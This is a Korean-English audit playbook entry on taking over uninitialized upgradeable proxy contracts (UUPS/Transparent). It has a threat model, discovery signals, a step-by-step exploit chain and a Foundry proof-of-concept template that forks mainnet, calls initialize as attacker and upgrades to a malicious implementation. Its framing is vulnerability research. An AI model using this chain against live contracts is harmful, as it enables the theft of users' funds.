# Scenario: Uninitialized Proxy / Implementation Takeover

> UUPS/Transparent proxy 패턴에서 `initialize` 미호출 시 누구나 owner 설정 가능.

## 1. Threat Model
- **타겟**: OpenZeppelin `Initializable` 기반 upgradeable contracts
- **공격자**: unauthenticated, on-chain 관찰자
- **Impact**: proxy upgrade via malicious implementation → 전체 자금 탈취
- **Severity**: Critical

## 2. Discovery Signals
- Implementation 계약의 `initialize()` 함수 direct 호출 가능 여부
- `initializer` modifier 존재하지만 deployer가 proxy 배포 후 initialize 호출 누락
- Etherscan "Contract Creation" tab에서 initialize tx 존재 여부 확인
- UUPS의 `_authorizeUpgrade` 구현이 `onlyOwner` → owner 비설정 시 누구나 upgrade 가능

## 3. Exploit Chain
```
A. Etherscan에서 proxy의 implementation slot 읽기 (EIP-1967)
B. implementation address의 initialize tx 탐지
C. 미호출이면 직접 initialize(attacker_owner) 호출
D. UUPS면 `upgradeToAndCall` 로 malicious impl로 교체
E. malicious impl에서 전체 자금 탈취
```

## 4. PoC Template
```solidity
interface IProxy {
    function initialize(address owner_) external;
    function upgradeToAndCall(address newImpl, bytes calldata data) external;
}

function test_takeover() public {
    vm.createSelectFork("mainnet", 19_000_000);
    address proxy = 0x...;
    // implementation slot (EIP-1967)
    bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
    address impl = address(uint160(uint256(vm.load(proxy, implSlot))));

    // 1. 아직 initialize 미호출인지
    IProxy(impl).initialize(attacker);  // 성공하면 취약

    // 2. proxy upgrade
    IProxy(proxy).upgradeToAndCall(malicious_impl, "");
}
```

## 5. Evidence Tier
- E1: fork에서 initialize 성공 + upgrade 성공 + 자금 탈취 assertion
- E2: initialize만 성공, upgrade는 다른 보호 있음
- E3: Etherscan 기반 정적 분석

## 6. Gate 1 / Gate 2
- [ ] Proxy의 creation tx에서 initialize 포함 여부 (직접 확인)
- [ ] `_disableInitializers()` 호출 여부 (v4.7+ 권장 패턴)
- [ ] UUPS의 `_authorizeUpgrade` 실제 제약
- [ ] 이미 공개 보고된 프로젝트인지 (Wormhole 2022 계보)

## 7. Variants
- **Implementation fresh deploy**: 업그레이드마다 implementation 재배포, 각각 initialize 필요
- **Storage collision**: 업그레이드 시 storage layout 변경으로 pre-existing state corruption
- **Diamond pattern (EIP-2535)**: facet의 selectorregistry takeover
- **Beacon proxy**: beacon 자체 owner 탈취

## 8. References
- Wormhole Bridge 2022 — $10M bounty (uninitialized UUPS implementation)
- OpenZeppelin "Uninitialized proxy" advisory (2021)
- Parity multisig 2017 — `initWallet` 고전 사례 (libraries)
